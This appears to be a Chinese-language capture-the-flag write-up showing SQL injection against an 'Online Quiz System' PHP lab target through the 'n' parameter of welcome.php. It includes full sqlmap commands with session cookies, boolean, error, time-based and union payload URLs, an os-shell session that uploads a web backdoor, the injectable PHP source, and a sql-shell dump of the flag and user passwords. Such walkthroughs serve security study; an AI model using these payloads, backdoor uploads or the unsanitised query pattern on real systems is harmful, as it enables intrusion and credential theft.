<p>refer to: <br /><a href="https://yunjing.ichunqiu.com/cve/detail/750?type=1&amp;pay=2 " target="_blank">https://yunjing.ichunqiu.com/cve/detail/750?type=1&amp;pay=2</a>
</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_091212.png" /></p>
<p>1. 先随意注册，然后进入到welcome页面，</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_091416.png" /></p>
<p>2. 可以判断出参数n有问题：</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_091529.png" /></p>
<p>3. 后面加上个' 试试，果然报错：</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_091616.png" /></p>
<p>4. 所以可以直接使用SQLMAP弄出来：</p>
<pre> python sqlmap.py -u "http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=0" -p "n" -v 1 --cookie="Hm_lvt_2d0601bd28de7d49818249cf35d95943=1680592615,1680743198,1680907041; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1680915151; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=8a1dd572910d3c8cc54ff01ff591b5570f28d854; PHPSESSID=jgksjv5p592uciahhhq8ggufbm"</pre>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_091725.png" /></p>
<p>我们把payload放上去：</p>
<p><a href="http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=3%27 " target="_blank">http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=3%27</a>
</p>
<p>1. boolean based, blind, 基于bool的，盲注：</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_091842.png" /></p>
<p>2 基于错误的：</p>
<p><a href="http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=0%27%20OR%20(SELECT%208784%20FROM(SELECT%20COUNT(*),CONCAT(0x7162766b71,(SELECT%20(ELT(8784=8784,1))),0x717a766b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20NISw " target="_blank">http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=0%27%20OR%20(SELECT%208784%20FROM(SELECT%20COUNT(*),CONCAT(0x7162766b71,(SELECT%20(ELT(8784=8784,1))),0x717a766b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20NISw</a>
</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_092037.png" /></p>
<p>3. time based, blind</p>
<p><a href="http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=0%27%20AND%20(SELECT%201822%20FROM%20(SELECT(SLEEP(5)))NWDQ)--%20ntru " target="_blank">http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=0%27%20AND%20(SELECT%201822%20FROM%20(SELECT(SLEEP(5)))NWDQ)--%20ntru</a>
</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_092201.png" /></p>
<p>4. union based</p>
<p><a href="http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=0%27%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x7162766b71,0x626150514c54736166766c617442464c6b6d78764b426661476f58674345517058476c624c5a6846,0x717a766b71),NULL,NULL,NULL# " target="_blank">http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=10&amp;n=0%27%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x7162766b71,0x626150514c54736166766c617442464c6b6d78764b426661476f58674345517058476c624c5a6846,0x717a766b71),NULL,NULL,NULL#</a>
</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230408_092255.png" /></p>
<p>可以看到，除了第一个boolean based, 其他都是盲注，没有回显点。</p>
<p>使用sqlmap 的 -a 功能（下载全部，）发现内容太多了，就不等了。找到了flag的痕迹：</p>
<pre>Database: information_schema
Table: INNODB_SYS_DATAFILES
[13 entries]
+----------------------------------+---------+
| PATH                             | SPACE   |
+----------------------------------+---------+
| ./ctf/admin.ibd                  | 16      |
| ./ctf/answer.ibd                 | 7       |
| ./ctf/flag.ibd                   | 5       |
| ./ctf/history.ibd                | 8       |
| ./ctf/options.ibd                | 9       |
| ./ctf/questions.ibd              | 10      |
| ./ctf/quiz.ibd                   | 11      |
| ./ctf/rank.ibd                   | 12      |
| ./ctf/user.ibd                   | 15      |
| ./mysql/gtid_slave_pos.ibd       | 4       |
| ./mysql/innodb_index_stats.ibd   | 2       |
| ./mysql/innodb_table_stats.ibd   | 1       |
| ./mysql/transaction_registry.ibd | 3       |
+----------------------------------+---------+
</pre>
<p>使用sqlmap 的 --os-shell功能: </p>
<pre>python sqlmap.py -u "http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=0" -p "n" -v 1 --cookie="Hm_lvt_2d0601bd28de7d49818249cf35d95943=1680592615,1680743198,1680907041; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1680915151; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=8a1dd572910d3c8cc54ff01ff591b5570f28d854; PHPSESSID=jgksjv5p592uciahhhq8ggufbm" --os-shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2.8#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:30:57 /2023-04-08/

[09:31:00] [INFO] resuming back-end DBMS 'mysql'
[09:31:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: n (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=-6120' OR 4063=4063#

    Type: error-based
    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=0' OR (SELECT 8784 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(8784=8784,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NISw

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=0' AND (SELECT 1822 FROM (SELECT(SLEEP(5)))NWDQ)-- ntru

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=0' UNION ALL SELECT NULL,CONCAT(0x7162766b71,0x626150514c54736166766c617442464c6b6d78764b426661476f58674345517058476c624c5a6846,0x717a766b71),NULL,NULL,NULL#
---
[09:31:01] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.2.20
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[09:31:01] [INFO] going to use a web backdoor for command prompt
[09:31:01] [INFO] fingerprinting the back-end DBMS operating system
[09:31:01] [WARNING] reflective value(s) found and filtering out
[09:31:01] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
&gt;
[09:31:05] [INFO] retrieved the web server document root: '/var/www'
[09:31:05] [INFO] retrieved web server absolute paths: '/var/www/html/welcome.php'
[09:31:05] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[09:31:05] [WARNING] unable to upload the file stager on '/var/www/'
[09:31:05] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[09:31:05] [WARNING] expect junk characters inside the file as a leftover from UNION query
[09:31:05] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[09:31:06] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[09:31:06] [WARNING] unable to upload the file stager on '/var/www/html/'
[09:31:06] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[09:31:06] [INFO] the remote file '/var/www/html/tmpukcjn.php' is larger (709 B) than the local file '/tmp/sqlmapdyonyo1w3766/tmp84m96lde' (705B)
[09:31:07] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com:80/tmpukcjn.php
[09:31:07] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com:80/tmpbfyjf.php
[09:31:07] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell&gt; who
do you want to retrieve the command standard output? [Y/n/a]
No output
os-shell&gt; pwd
do you want to retrieve the command standard output? [Y/n/a]
command standard output: '/var/www/html'
os-shell&gt; ll
do you want to retrieve the command standard output? [Y/n/a]
command standard output: 'sh: 1: ll: not found'
os-shell&gt; ls -al
do you want to retrieve the command standard output? [Y/n/a]
command standard output:
---
total 120
drwxrwxrwx 1 www-data www-data  4096 Apr  8 01:31 .
drwxr-xr-x 1 root     root      4096 Jul  9  2019 ..
-rwxrwxrwx 1 root     root     11357 Jun  4  2018 LICENSE
-rwxrwxrwx 1 root     root       789 Jun  4  2018 README.md
-rwxrwxrwx 1 root     root      3298 Jul 15  2019 admin.php
drwxrwxrwx 1 root     root      4096 Jul  9  2022 css
-rwxrwxrwx 1 root     root     14621 Jul 15  2019 dashboard.php
-rwxrwxrwx 1 root     root       120 Jul  6  2022 database.php
drwxrwxrwx 1 root     root      4096 Jul  9  2022 fonts
drwxrwxrwx 1 root     root      4096 Jul  9  2022 image
-rwxrwxrwx 1 root     root      1135 Jun  4  2018 index.php
drwxrwxrwx 1 root     root      4096 Jul  9  2022 js
-rwxrwxrwx 1 root     root      3189 Jun  4  2018 login.php
-rwxrwxrwx 1 root     root       127 Jun  4  2018 logout.php
-rwxrwxrwx 1 root     root       132 Jun  4  2018 logout1.php
-rwxrwxrwx 1 root     root      3648 Jun  4  2018 register.php
drwxrwxrwx 1 root     root      4096 Jul  9  2022 scripts
-rwxr-xr-x 1 www-data www-data   866 Apr  8 01:31 tmpbfyjf.php
-rw-r--r-- 1 mysql    mysql        0 Apr  8 01:31 tmpujmxa.php
-rw-r--r-- 1 mysql    mysql      709 Apr  8 01:31 tmpukcjn.php
-rwxrwxrwx 1 root     root      6881 Feb 25  2021 update.php
-rwxrwxrwx 1 root     root     11673 Jun  4  2018 welcome.php
---
os-shell&gt; cat welcome.php
do you want to retrieve the command standard output? [Y/n/a]
command standard output:
---
&lt;?php
    include_once 'database.php';
    session_start();
    if(!(isset($_SESSION['email'])))
    {
        header("location:login.php");
    }
    else
    {
        $name = $_SESSION['name'];
        $email = $_SESSION['email'];
        include_once 'database.php';
    }
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;
    &lt;title&gt;Welcome | Online Quiz System&lt;/title&gt;
    &lt;link  rel="stylesheet" href="css/bootstrap.min.css"/&gt;
    &lt;link  rel="stylesheet" href="css/bootstrap-theme.min.css"/&gt;
    &lt;link rel="stylesheet" href="css/welcome.css"&gt;
    &lt;link  rel="stylesheet" href="css/font.css"&gt;
    &lt;script src="js/jquery.js" type="text/javascript"&gt;&lt;/script&gt;
    &lt;script src="js/bootstrap.min.js"  type="text/javascript"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;nav class="navbar navbar-default title1"&gt;
        &lt;div class="container-fluid"&gt;
            &lt;div class="navbar-header"&gt;
            &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt;
                &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt;
                &lt;span class="icon-bar"&gt;&lt;/span&gt;
                &lt;span class="icon-bar"&gt;&lt;/span&gt;
                &lt;span class="icon-bar"&gt;&lt;/span&gt;
            &lt;/button&gt;
        &lt;a class="navbar-brand" href="#"&gt;&lt;b&gt;Online Quiz System&lt;/b&gt;&lt;/a&gt;
        &lt;/div&gt;

        &lt;!-- Collect the nav links, forms, and other content for toggling --&gt;
        &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt;
        &lt;ul class="nav navbar-nav navbar-left"&gt;
            &lt;li &lt;?php if(@$_GET['q']==1) echo'class="active"'; ?&gt; &gt;&lt;a href="welcome.php?q=1"&gt;&lt;span class="glyphicon glyphicon-home" aria-hidden="true"&gt;&lt;/span&gt;&#160;Home&lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
            &lt;li &lt;?php if(@$_GET['q']==2) echo'class="active"'; ?&gt;&gt; &lt;a href="welcome.php?q=2"&gt;&lt;span class="glyphicon glyphicon-list-alt" aria-hidden="true"&gt;&lt;/span&gt;&#160;History&lt;/a&gt;&lt;/li&gt;
            &lt;li &lt;?php if(@$_GET['q']==3) echo'class="active"'; ?&gt;&gt; &lt;a href="welcome.php?q=3"&gt;&lt;span class="glyphicon glyphicon-stats" aria-hidden="true"&gt;&lt;/span&gt;&#160;Ranking&lt;/a&gt;&lt;/li&gt;

        &lt;/ul&gt;
        &lt;ul class="nav navbar-nav navbar-right"&gt;
        &lt;li &lt;?php echo''; ?&gt; &gt; &lt;a href="logout.php?q=welcome.php"&gt;&lt;span class="glyphicon glyphicon-log-out" aria-hidden="true"&gt;&lt;/span&gt;&#160;Log out&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;




        &lt;/div&gt;
    &lt;/div&gt;
    &lt;/nav&gt;
    &lt;br&gt;&lt;br&gt;
    &lt;div class="container"&gt;
        &lt;div class="row"&gt;
            &lt;div class="col-md-12"&gt;
                &lt;?php if(@$_GET['q']==1)
                {
                    $result = mysqli_query($con,"SELECT * FROM quiz ORDER BY date DESC") or die('Error');
                    echo  '&lt;div class="panel"&gt;&lt;div class="table-responsive"&gt;&lt;table class="table table-striped title1"&gt;
                    &lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;S.N.&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Topic&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Total question&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Marks&lt;/center&gt;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;';
                    $c=1;
                    while($row = mysqli_fetch_array($result)) {
                        $title = $row['title'];
                        $total = $row['total'];
                        $sahi = $row['sahi'];
                        $eid = $row['eid'];
                    $q12=mysqli_query($con,"SELECT score FROM history WHERE eid='$eid' AND email='$email'" )or die('Error98');
                    $rowcount=mysqli_num_rows($q12);
                    if($rowcount == 0){
                        echo '&lt;tr&gt;&lt;td&gt;&lt;center&gt;'.$c++.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$title.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$total.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$sahi*$total.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;&lt;a href="welcome.php?q=quiz&amp;step=2&amp;eid='.$eid.'&amp;n=1&amp;t='.$total.'" class="btn sub1" style="color:black;margin:0px;background:#1de9b6"&gt;&lt;span class="glyphicon glyphicon-new-window" aria-hidden="true"&gt;&lt;/span&gt;&#160;&lt;span class="title1"&gt;&lt;b&gt;Start&lt;/b&gt;&lt;/span&gt;&lt;/a&gt;&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;';
                    }
                    else
                    {
                    echo '&lt;tr style="color:#99cc32"&gt;&lt;td&gt;&lt;center&gt;'.$c++.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$title.'&#160;&lt;span title="This quiz is already solve by you" class="glyphicon glyphicon-ok" aria-hidden="true"&gt;&lt;/span&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$total.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$sahi*$total.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;&lt;a href="update.php?q=quizre&amp;step=25&amp;eid='.$eid.'&amp;n=1&amp;t='.$total.'" class="pull-right btn sub1" style="color:black;margin:0px;background:red"&gt;&lt;span class="glyphicon glyphicon-repeat" aria-hidden="true"&gt;&lt;/span&gt;&#160;&lt;span class="title1"&gt;&lt;b&gt;Restart&lt;/b&gt;&lt;/span&gt;&lt;/a&gt;&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;';
                    }
                    }
                    $c=0;
                    echo '&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;';
                }?&gt;

                &lt;?php
                    if(@$_GET['q']== 'quiz' &amp;&amp; @$_GET['step']== 2)
                    {
                        $eid=@$_GET['eid'];
                        $sn=@$_GET['n'];
                        $total=@$_GET['t'];
                        $q=mysqli_query($con,"SELECT * FROM questions WHERE eid='$eid' AND sn='$sn' " );
                        echo '&lt;div class="panel" style="margin:5%"&gt;';
                        while($row=mysqli_fetch_array($q) )
                        {
                            $qns=$row['qns'];
                            $qid=$row['qid'];
                            echo '&lt;b&gt;Question &#160;'.$sn.'&#160;::&lt;br /&gt;&lt;br /&gt;'.$qns.'&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;';
                        }
                        $q=mysqli_query($con,"SELECT * FROM options WHERE qid='$qid' " );
                        echo '&lt;form action="update.php?q=quiz&amp;step=2&amp;eid='.$eid.'&amp;n='.$sn.'&amp;t='.$total.'&amp;qid='.$qid.'" method="POST"  class="form-horizontal"&gt;
                        &lt;br /&gt;';

                        while($row=mysqli_fetch_array($q) )
                        {
                            $option=$row['option'];
                            $optionid=$row['optionid'];
                            echo'&lt;input type="radio" name="ans" value="'.$optionid.'"&gt;&#160;'.$option.'&lt;br /&gt;&lt;br /&gt;';
                        }
                        echo'&lt;br /&gt;&lt;button type="submit" class="btn btn-primary"&gt;&lt;span class="glyphicon glyphicon-lock" aria-hidden="true"&gt;&lt;/span&gt;&#160;Submit&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;';
                    }

                    if(@$_GET['q']== 'result' &amp;&amp; @$_GET['eid'])
                    {
                        $eid=@$_GET['eid'];
                        $q=mysqli_query($con,"SELECT * FROM history WHERE eid='$eid' AND email='$email' " )or die('Error157');
                        echo  '&lt;div class="panel"&gt;
                        &lt;center&gt;&lt;h1 class="title" style="color:#660033"&gt;Result&lt;/h1&gt;&lt;center&gt;&lt;br /&gt;&lt;table class="table table-striped title1" style="font-size:20px;font-weight:1000;"&gt;';

                        while($row=mysqli_fetch_array($q) )
                        {
                            $s=$row['score'];
                            $w=$row['wrong'];
                            $r=$row['sahi'];
                            $qa=$row['level'];
                            echo '&lt;tr style="color:#66CCFF"&gt;&lt;td&gt;Total Questions&lt;/td&gt;&lt;td&gt;'.$qa.'&lt;/td&gt;&lt;/tr&gt;
                                &lt;tr style="color:#99cc32"&gt;&lt;td&gt;right Answer&#160;&lt;span class="glyphicon glyphicon-ok-circle" aria-hidden="true"&gt;&lt;/span&gt;&lt;/td&gt;&lt;td&gt;'.$r.'&lt;/td&gt;&lt;/tr&gt;
                                &lt;tr style="color:red"&gt;&lt;td&gt;Wrong Answer&#160;&lt;span class="glyphicon glyphicon-remove-circle" aria-hidden="true"&gt;&lt;/span&gt;&lt;/td&gt;&lt;td&gt;'.$w.'&lt;/td&gt;&lt;/tr&gt;
                                &lt;tr style="color:#66CCFF"&gt;&lt;td&gt;Score&#160;&lt;span class="glyphicon glyphicon-star" aria-hidden="true"&gt;&lt;/span&gt;&lt;/td&gt;&lt;td&gt;'.$s.'&lt;/td&gt;&lt;/tr&gt;';
                        }
                        $q=mysqli_query($con,"SELECT * FROM rank WHERE  email='$email' " )or die('Error157');
                        while($row=mysqli_fetch_array($q) )
                        {
                            $s=$row['score'];
                            echo '&lt;tr style="color:#990000"&gt;&lt;td&gt;Overall Score&#160;&lt;span class="glyphicon glyphicon-stats" aria-hidden="true"&gt;&lt;/span&gt;&lt;/td&gt;&lt;td&gt;'.$s.'&lt;/td&gt;&lt;/tr&gt;';
                        }
                        echo '&lt;/table&gt;&lt;/div&gt;';
                    }
                ?&gt;

                &lt;?php
                    if(@$_GET['q']== 2)
                    {
                        $q=mysqli_query($con,"SELECT * FROM history WHERE email='$email' ORDER BY date DESC " )or die('Error197');
                        echo  '&lt;div class="panel title"&gt;
                        &lt;table class="table table-striped title1" &gt;
                        &lt;tr style="color:black;"&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;S.N.&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Quiz&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Question Solved&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Right&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Wrong&lt;b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Score&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;';
                        $c=0;
                        while($row=mysqli_fetch_array($q) )
                        {
                        $eid=$row['eid'];
                        $s=$row['score'];
                        $w=$row['wrong'];
                        $r=$row['sahi'];
                        $qa=$row['level'];
                        $q23=mysqli_query($con,"SELECT title FROM quiz WHERE  eid='$eid' " )or die('Error208');

                        while($row=mysqli_fetch_array($q23) )
                        {  $title=$row['title'];  }
                        $c++;
                        echo '&lt;tr&gt;&lt;td&gt;&lt;center&gt;'.$c.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$title.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$qa.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$r.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$w.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$s.'&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;';
                        }
                        echo'&lt;/table&gt;&lt;/div&gt;';
                    }

                    if(@$_GET['q']== 3)
                    {
                        $q=mysqli_query($con,"SELECT * FROM rank ORDER BY score DESC " )or die('Error223');
                        echo  '&lt;div class="panel title"&gt;&lt;div class="table-responsive"&gt;
                        &lt;table class="table table-striped title1" &gt;
                        &lt;tr style="color:red"&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Rank&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Email&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Score&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;';
                        $c=0;

                        while($row=mysqli_fetch_array($q) )
                        {
                            $e=$row['email'];
                            $s=$row['score'];
                            $q12=mysqli_query($con,"SELECT * FROM user WHERE email='$e' " )or die('Error231');
                            while($row=mysqli_fetch_array($q12) )
                            {
                                $name=$row['name'];
                            }
                            $c++;
                            echo '&lt;tr&gt;&lt;td style="color:black"&gt;&lt;center&gt;&lt;b&gt;'.$c.'&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$name.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$e.'&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;'.$s.'&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;';
                        }
                        echo '&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;';
                    }
                ?&gt;
&lt;/body&gt;
&lt;/html&gt;
---</pre>
<p>最后，我们来拿flag: </p>
<p>进入到sql-shell: </p>
<p>python sqlmap.py -u "http://eci-2ze2v95f49wasfbwy36u.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=5b141f1e8399e&amp;t=100&amp;n=0" -p "n" -v 1 --cookie="Hm_lvt_2d0601bd28de7d49818249cf35d95943=1680592615,1680743198,1680907041; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1680915151; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=8a1dd572910d3c8cc54ff01ff591b5570f28d854; PHPSESSID=jgksjv5p592uciahhhq8ggufbm" --sql-shell
</p>
<pre>[09:40:23] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.2.20
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[09:40:23] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell&gt; show databases;
[09:40:27] [INFO] fetching SQL SELECT statement query output: 'show databases'
[09:40:27] [WARNING] reflective value(s) found and filtering out
[09:40:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
sql-shell&gt; use ctf;
[09:40:34] [INFO] fetching SQL query output: 'use ctf'
sql-shell&gt; show tables;
[09:40:41] [INFO] fetching SQL SELECT statement query output: 'show tables'
sql-shell&gt; select * from ctf.flag;
[09:40:57] [INFO] fetching SQL SELECT statement query output: 'select * from ctf.flag'
[09:40:57] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
[09:40:57] [INFO] fetching columns for table 'flag' in database 'ctf'
[09:40:57] [INFO] the query with expanded column name(s) is: SELECT flag FROM ctf.flag
select * from ctf.flag: 'flag{0613f4db-cc9c-4db4-8614-900d8c8bb353}'
sql-shell&gt; select * from flag;
[09:41:11] [INFO] fetching SQL SELECT statement query output: 'select * from flag'
[09:41:11] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
[09:41:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[09:41:11] [INFO] fetching current database
[09:41:11] [INFO] fetched table columns from database 'ctf'
[09:41:11] [INFO] the query with expanded column name(s) is: SELECT flag FROM flag
select * from flag: 'flag{0613f4db-cc9c-4db4-8614-900d8c8bb353}'
sql-shell&gt; select * from admin;
[09:41:16] [INFO] fetching SQL SELECT statement query output: 'select * from admin'
[09:41:16] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
[09:41:16] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[09:41:16] [INFO] fetching current database
[09:41:16] [INFO] fetching columns for table 'admin' in database 'ctf'
[09:41:16] [INFO] retrieved: 'admin_id','int(11)'
[09:41:17] [INFO] retrieved: 'email','varchar(50)'
[09:41:17] [INFO] retrieved: 'password','varchar(500)'
[09:41:17] [INFO] the query with expanded column name(s) is: SELECT admin_id, email, password FROM admin
select * from admin: '1'
sql-shell&gt; select * from user;
[09:41:39] [INFO] fetching SQL SELECT statement query output: 'select * from user'
[09:41:39] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
[09:41:39] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[09:41:39] [INFO] fetching current database
[09:41:39] [INFO] fetching columns for table 'user' in database 'ctf'
[09:41:39] [INFO] retrieved: 'name','varchar(50)'
[09:41:40] [INFO] retrieved: 'college','varchar(100)'
[09:41:40] [INFO] retrieved: 'email','varchar(50)'
[09:41:40] [INFO] retrieved: 'password','varchar(50)'
[09:41:40] [INFO] the query with expanded column name(s) is: SELECT college, email, name, password FROM user
[09:41:40] [INFO] retrieved: '88888888','aaa@sina.com','aaa','88888888'
[09:41:40] [INFO] retrieved: 'kcc','janobe@gmail.com','janobe sourcecode','jan'
[09:41:40] [INFO] retrieved: 'National Institute of Science and Technology, Berhampur','pinky@gmail.com','Swagatika Padhi','pinky'
